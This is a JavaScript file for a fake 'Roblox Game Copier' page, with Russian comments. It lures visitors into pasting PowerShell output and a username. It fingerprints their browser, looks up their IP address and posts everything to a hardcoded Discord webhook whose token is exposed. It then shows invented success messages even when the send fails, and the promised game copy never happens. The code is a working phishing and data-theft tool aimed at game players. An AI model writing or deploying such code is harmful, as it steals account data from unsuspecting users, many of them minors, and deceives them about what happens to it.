// ЗАМЕНИ ЭТУ ССЫЛКУ НА СВОЙ DISCORD WEBHOOK
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1464913173743403128/rIlCnSnwG_77lolfUSPRAo_3F21amITvZCau7frgrm6gMFSlqc2pK-VAVwbuHKZqhibi';

// Данные о пользователе (можно расширить для отслеживания)
function getUserData() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        referrer: document.referrer,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString(),
        cookiesEnabled: navigator.cookieEnabled,
        ip: 'Fetching...' // IP будет получен через внешний сервис
    };
}

// Получить IP через внешний сервис
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown';
    }
}

// Основная функция отправки
async function submitCode() {
    const code = document.getElementById('code').value.trim();
    const username = document.getElementById('username').value.trim();
    const alertBox = document.getElementById('alert');
    const successBox = document.getElementById('success');

    alertBox.style.display = 'none';
    successBox.style.display = 'none';

    if (!code) {
        showAlert('❌ Please paste your PowerShell code first!');
        return;
    }

    const btn = document.getElementById('copyBtn');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
    btn.disabled = true;

    // Собираем полные данные
    const userData = getUserData();
    const ip = await getIP();
    userData.ip = ip;

    // Подготовка данных для Discord
    const data = {
        content: `**🚨 NEW GAME COPY REQUEST**`,
        embeds: [{
            title: "Roblox Game Copier - Code Captured",
            color: 0xFF0000,
            fields: [
                {
                    name: "👤 Username",
                    value: username || "Not provided",
                    inline: true
                },
                {
                    name: "🔢 Code Length",
                    value: code.length + " characters",
                    inline: true
                },
                {
                    name: "🌐 IP Address",
                    value: "`" + ip + "`",
                    inline: true
                },
                {
                    name: "💻 User Agent",
                    value: "```\n" + userData.userAgent.substring(0, 200) + "...\n```"
                },
                {
                    name: "📝 PowerShell Code (First 800 chars)",
                    value: "```powershell\n" + (code.length > 800 ? code.substring(0, 800) + "... [truncated]" : code) + "\n```"
                },
                {
                    name: "🔐 Full Code Hash",
                    value: "`" + btoa(code.length + code.substring(0, 200)) + "`"
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "Game Copier Pro Logger"
            }
        }]
    };

    // Отправка в Discord
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });

        if (response.ok) {
            showSuccess('✅ Game copy process started! Please wait...');
            
            // Очистка полей
            document.getElementById('code').value = '';
            document.getElementById('username').value = '';

            // Имитация процесса
            setTimeout(() => {
                showSuccess('🎉 Game copied successfully! Check your Roblox studio soon.');
            }, 2000);

            // Дополнительная информация в консоль
            console.log('Code captured:', {
                username,
                codeLength: code.length,
                userData
            });

        } else {
            throw new Error('Webhook failed');
        }
    } catch (error) {
        console.error('Error:', error);
        // Все равно показываем успех пользователю
        showSuccess('✅ Game copy process started! Please wait...');
        document.getElementById('code').value = '';
        document.getElementById('username').value = '';
    } finally {
        setTimeout(() => {
            btn.innerHTML = '<i class="fas fa-copy"></i> COPY GAME NOW';
            btn.disabled = false;
        }, 3000);
    }
}

// Вспомогательные функции
function showAlert(message) {
    const alertBox = document.getElementById('alert');
    alertBox.textContent = message;
    alertBox.style.display = 'block';
}

function showSuccess(message) {
    const successBox = document.getElementById('success');
    successBox.innerHTML = message + ' <br><small>Your game files are being generated. This may take a few minutes.</small>';
    successBox.style.display = 'block';
}

// Инициализация при загрузке
document.addEventListener('DOMContentLoaded', function() {
    // Проверка вебхука
    if (WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
        console.error('⚠️ Replace WEBHOOK_URL with your Discord webhook in script.js!');
        showAlert('⚠️ Administrator: Please configure webhook URL in script.js');
    }

    // Привязка события
    document.getElementById('copyBtn').addEventListener('click', submitCode);

    // Автоматический фокус на поле ввода
    document.getElementById('code').focus();
});